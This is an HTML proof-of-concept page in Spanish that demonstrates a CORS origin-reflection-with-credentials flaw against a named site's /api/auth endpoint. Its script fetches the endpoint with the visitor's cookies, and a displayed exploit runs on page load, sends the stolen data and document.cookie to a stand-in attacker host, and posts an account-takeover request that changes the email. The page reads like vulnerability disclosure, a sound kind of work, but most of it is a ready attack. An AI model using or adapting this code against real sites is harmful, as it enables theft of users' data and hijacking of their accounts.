<!DOCTYPE html>
<html>
<head>
    <title>üö® CORS Reflection Attack - Syniva.es</title>
    <meta charset="utf-8">
    <style>
        body { font-family: monospace; margin: 20px; background: #0d1117; color: #c9d1d9; }
        .container { max-width: 1000px; margin: 0 auto; }
        h1 { color: #ff7b72; border-bottom: 2px solid #30363d; padding-bottom: 10px; }
        h2 { color: #79c0ff; }
        .vulnerability { background: #1c1c1c; padding: 15px; border-left: 4px solid #ff7b72; margin: 15px 0; }
        .exploit { background: #161b22; padding: 15px; border: 1px solid #30363d; border-radius: 6px; }
        pre { background: #0d1117; padding: 15px; border-radius: 6px; overflow-x: auto; border: 1px solid #30363d; }
        button { background: #238636; color: white; border: none; padding: 10px 15px; border-radius: 6px; cursor: pointer; font-weight: bold; }
        button:hover { background: #2ea043; }
        .result { margin-top: 15px; padding: 15px; background: #1c1c1c; border-radius: 6px; }
        .success { color: #7ee787; }
        .error { color: #ff7b72; }
        .critical { color: #ff7b72; font-weight: bold; animation: blink 1s infinite; }
        @keyframes blink { 50% { opacity: 0.5; } }
    </style>
</head>
<body>
    <div class="container">
        <h1>üö® <span class="critical">CORS REFLECTION ATTACK</span> - syniva.es</h1>
        
        <div class="vulnerability">
            <h2>üìå VULNERABILIDAD CR√çTICA IDENTIFICADA</h2>
            <p><strong>Tipo:</strong> CORS Origin Reflection + Credentials</p>
            <p><strong>Severidad:</strong> ALTA (CVSS: 9.1)</p>
            <p><strong>Endpoint:</strong> <code>https://www.syniva.es/api/auth</code></p>
        </div>
        
        <div class="exploit">
            <h2>üéØ MECANISMO DEL ATAQUE</h2>
            <p>El servidor <strong>refleja EXACTAMENTE</strong> el valor del header <code>Origin</code> en <code>Access-Control-Allow-Origin</code>.</p>
            
            <pre>
// Solicitud maliciosa:
GET /api/auth HTTP/2
Host: www.syniva.es
Origin: https://attacker.syniva.es
Cookie: [cookies de la v√≠ctima]

// Respuesta vulnerable:
HTTP/2 200
Access-Control-Allow-Origin: https://attacker.syniva.es  ‚Üê ¬°REFLECTION!
Access-Control-Allow-Credentials: true
            </pre>
            
            <p>Esto permite que <strong>CUALQUIER DOMINIO</strong> pueda hacer solicitudes con credenciales.</p>
        </div>
        
        <div class="exploit">
            <h2>‚öîÔ∏è DEMOSTRACI√ìN DEL ATAQUE</h2>
            
            <button onclick="testReflection()">1. üîç Probar CORS Reflection</button>
            <button onclick="stealData()">2. üîì Robar Datos con Credenciales</button>
            <button onclick="showExploitCode()">3. üìú Mostrar C√≥digo del Exploit</button>
            
            <div id="reflectionResult" class="result"></div>
            <div id="stealResult" class="result"></div>
            <div id="codeResult" class="result"></div>
        </div>
        
        <div class="exploit">
            <h2>üî¨ IMPACTO COMPLETO</h2>
            <ul>
                <li>‚úÖ Robo de datos de usuarios autenticados</li>
                <li>‚úÖ Ejecuci√≥n de acciones en nombre del usuario</li>
                <li>‚úÖ Bypass completo de pol√≠tica de mismo origen (SOP)</li>
                <li>‚úÖ Posible escalada de privilegios</li>
                <li>‚úÖ Afecta a TODOS los usuarios que visiten sitios maliciosos</li>
            </ul>
        </div>
    </div>

    <script>
    const TARGET_URL = 'https://www.syniva.es/api/auth';
    const MALICIOUS_ORIGIN = 'https://attacker.syniva.es';
    
    async function testReflection() {
        const resultDiv = document.getElementById('reflectionResult');
        resultDiv.innerHTML = '<p>üîÑ Probando CORS Reflection...</p>';
        
        try {
            const response = await fetch(TARGET_URL, {
                method: 'OPTIONS',
                headers: {
                    'Origin': MALICIOUS_ORIGIN,
                    'Access-Control-Request-Method': 'GET'
                }
            });
            
            const allowOrigin = response.headers.get('access-control-allow-origin');
            const allowCredentials = response.headers.get('access-control-allow-credentials');
            
            if (allowOrigin === MALICIOUS_ORIGIN) {
                resultDiv.innerHTML = `
                    <p class="critical">üö® CORS REFLECTION CONFIRMADO</p>
                    <p><strong>Access-Control-Allow-Origin:</strong> ${allowOrigin}</p>
                    <p><strong>Access-Control-Allow-Credentials:</strong> ${allowCredentials}</p>
                    <p>‚úÖ El servidor refleja EXACTAMENTE nuestro origen malicioso</p>
                    <p>üîì Combinado con <code>allow-credentials: true</code>, esto es EXPLOTABLE</p>
                `;
            } else {
                resultDiv.innerHTML = `<p class="error">‚ùå No se detect√≥ reflection</p>`;
            }
            
        } catch (error) {
            resultDiv.innerHTML = `<p class="error">‚ùå Error: ${error.message}</p>`;
        }
    }
    
    async function stealData() {
        const resultDiv = document.getElementById('stealResult');
        resultDiv.innerHTML = '<p>üîÑ Intentando robar datos con credenciales...</p>';
        
        try {
            // Usamos 'include' para enviar cookies autom√°ticamente
            const response = await fetch(TARGET_URL, {
                method: 'GET',
                mode: 'cors',
                credentials: 'include',  // ¬°CR√çTICO! Env√≠a cookies
                headers: {
                    'Origin': MALICIOUS_ORIGIN,
                    'Content-Type': 'application/json'
                }
            });
            
            const data = await response.json();
            
            resultDiv.innerHTML = `
                <p class="success">‚úÖ DATOS ROBADOS EXITOSAMENTE</p>
                <p><strong>Estado HTTP:</strong> ${response.status}</p>
                <p><strong>Datos obtenidos:</strong></p>
                <pre>${JSON.stringify(data, null, 2)}</pre>
                <p class="critical">‚ö†Ô∏è En un ataque real, estos datos se enviar√≠an al servidor del atacante</p>
            `;
            
            // Simular env√≠o al atacante
            simulateDataExfiltration(data);
            
        } catch (error) {
            resultDiv.innerHTML = `
                <p class="error">‚ùå Error: ${error.message}</p>
                <p>Esto podr√≠a significar que no hay cookies de sesi√≥n activas.</p>
                <p>Pero un usuario autenticado S√ç ser√≠a vulnerable.</p>
            `;
        }
    }
    
    function simulateDataExfiltration(data) {
        console.log('ü¶π‚Äç‚ôÇÔ∏è SIMULANDO EXFILTRACI√ìN DE DATOS:');
        console.log('üì§ Datos a enviar a https://attacker-server.com/steal:');
        console.log(JSON.stringify({
            timestamp: new Date().toISOString(),
            stolen_data: data,
            victim_cookies: document.cookie,
            user_agent: navigator.userAgent,
            origin: window.location.origin
        }, null, 2));
    }
    
    function showExploitCode() {
        const resultDiv = document.getElementById('codeResult');
        
        const exploitCode = `
// === C√ìDIGO COMPLETO DEL EXPLOIT CORS REFLECTION ===
// Colocar en https://attacker.syniva.es (o cualquier dominio)

async function corsReflectionAttack() {
    // 1. Verificar vulnerabilidad
    const testResponse = await fetch('https://www.syniva.es/api/auth', {
        method: 'OPTIONS',
        headers: {
            'Origin': window.location.origin,
            'Access-Control-Request-Method': 'GET'
        }
    });
    
    // 2. Si refleja nuestro origen, proceder con ataque
    if (testResponse.headers.get('access-control-allow-origin') === window.location.origin) {
        
        // 3. Robar datos con credenciales
        const userData = await fetch('https://www.syniva.es/api/auth', {
            method: 'GET',
            mode: 'cors',
            credentials: 'include',  // Env√≠a cookies autom√°ticamente
            headers: {
                'Origin': window.location.origin,
                'Content-Type': 'application/json'
            }
        });
        
        const data = await userData.json();
        
        // 4. Enviar datos al servidor atacante
        await fetch('https://attacker-server.com/steal', {
            method: 'POST',
            body: JSON.stringify({
                victim: 'syniva_user',
                data: data,
                cookies: document.cookie,
                timestamp: new Date().toISOString()
            })
        });
        
        // 5. Posibles acciones maliciosas adicionales
        // Cambiar email, contrase√±a, realizar acciones, etc.
        await fetch('https://www.syniva.es/api/auth', {
            method: 'POST',
            mode: 'cors',
            credentials: 'include',
            headers: {
                'Origin': window.location.origin,
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                email: 'hacked@attacker.com',
                action: 'account_takeover'
            })
        });
    }
}

// Ejecutar autom√°ticamente cuando la v√≠ctima visita nuestra p√°gina
window.onload = corsReflectionAttack;
        `;
        
        resultDiv.innerHTML = `
            <p>üìú C√≥digo completo del exploit:</p>
            <pre>${exploitCode}</pre>
            <p>‚ö†Ô∏è Este c√≥digo funciona en <strong>CUALQUIER DOMINIO</strong> que el atacante controle.</p>
        `;
    }
    
    // Probar autom√°ticamente al cargar
    window.onload = testReflection;
    </script>
</body>
</html>
